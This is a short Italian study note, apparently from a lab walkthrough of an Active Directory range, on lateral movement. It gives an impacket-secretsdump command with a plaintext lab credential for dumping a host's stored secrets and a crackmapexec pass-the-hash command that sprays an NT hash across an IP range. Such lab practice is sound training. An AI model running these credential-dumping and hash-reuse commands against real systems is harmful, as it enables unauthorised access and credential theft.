### **Lateral Movement**
Prima di saltare da una macchina all'altra è essenziale ottenere tutti i "Secrets" della macchina pwnata.
```bash
impacket-secretsdump NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
```
![[Pasted image 20230906162707.png]]
Per quanto riguarda il SAM i risultato sono mostrati cosi:
```
<Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:
```
Questo valore sulle LM hash significa vuoto ==aad3b435b51404eeaad3b435b51404ee==

*Pass the Hash*
Spesso nel creare i network gli amministratori copiano le macchine, quindi le password vengono riutilizzate.
Per testare ciò si può usare crackmapexec
```bash
crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
```
![[Pasted image 20230906164347.png]]
